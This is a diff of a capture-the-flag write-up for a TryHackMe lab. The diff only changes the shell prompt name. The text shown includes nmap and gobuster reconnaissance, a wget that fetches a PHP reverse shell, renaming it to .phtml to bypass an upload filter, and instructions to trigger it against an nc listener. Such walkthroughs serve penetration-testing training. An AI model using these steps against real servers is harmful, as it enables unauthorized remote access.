@@ -4,7 +4,7 @@
 
 # Recon
 ```console
-kali@kali:~/vulnUniversity$ nmap -p- 10.10.154.5 # what port are open
+bibo318@parrot:~/vulnUniversity$ nmap -p- 10.10.154.5 # what port are open
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 19:32 EDT
 Nmap scan report for 10.10.154.5
 Host is up (0.045s latency).
@@ -18,7 +18,7 @@ PORT     STATE SERVICE
 3333/tcp open  dec-notes
 
 Nmap done: 1 IP address (1 host up) scanned in 22.64 seconds
-kali@kali:~/vulnUniversity$ nmap -p3128 -sV 10.10.154.5 # check service version on port 3128
+bibo318@parrot:~/vulnUniversity$ nmap -p3128 -sV 10.10.154.5 # check service version on port 3128
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 19:34 EDT
 Nmap scan report for 10.10.154.5
 Host is up (0.045s latency).
@@ -29,7 +29,7 @@ PORT     STATE SERVICE    VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds
 
-kali@kali:~/vulnUniversity$ nmap -p3333 -sV 10.10.154.5 # http and OS
+bibo318@parrot:~/vulnUniversity$ nmap -p3333 -sV 10.10.154.5 # http and OS
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 19:47 EDT
 Nmap scan report for 10.10.154.5
 Host is up (0.047s latency).
@@ -42,7 +42,7 @@ Nmap done: 1 IP address (1 host up) scanned in 22.23 seconds
 ```
 # [Task 3] Locating directories using GoBuster 
 ```console
-kali@kali:~/vulnUniversity$ gobuster dir -u http://10.10.154.5:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
+bibo318@parrot:~/vulnUniversity$ gobuster dir -u http://10.10.154.5:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -97,11 +97,11 @@ here is the result:
 
 so now let download our php reverse shell and change file extension toll phtml since it is not block by the website
 ```console
-kali@kali:~/THM$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
-kali@kali:~/THM$ ls
+bibo318@parrot:~/THM$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+bibo318@parrot:~/THM$ ls
 AD  kuroHat.ovpn  mrRobot  phpext.txt  php-reverse-shell.php
-kali@kali:~/THM$ mv php-reverse-shell.php php-reverse-shell.phtml
-kali@kali:~/THM$ ls
+bibo318@parrot:~/THM$ mv php-reverse-shell.php php-reverse-shell.phtml
+bibo318@parrot:~/THM$ ls
 AD  kuroHat.ovpn  mrRobot  phpext.txt  php-reverse-shell.phtml
 ```
 Before uploading the shell, dont forget to change the IP and PORT in the script. Upload it. and run nc listening to the port. To execute our payload visite `http://<ip>:3333/internal/uploads/php-reverse-shell.phtml`
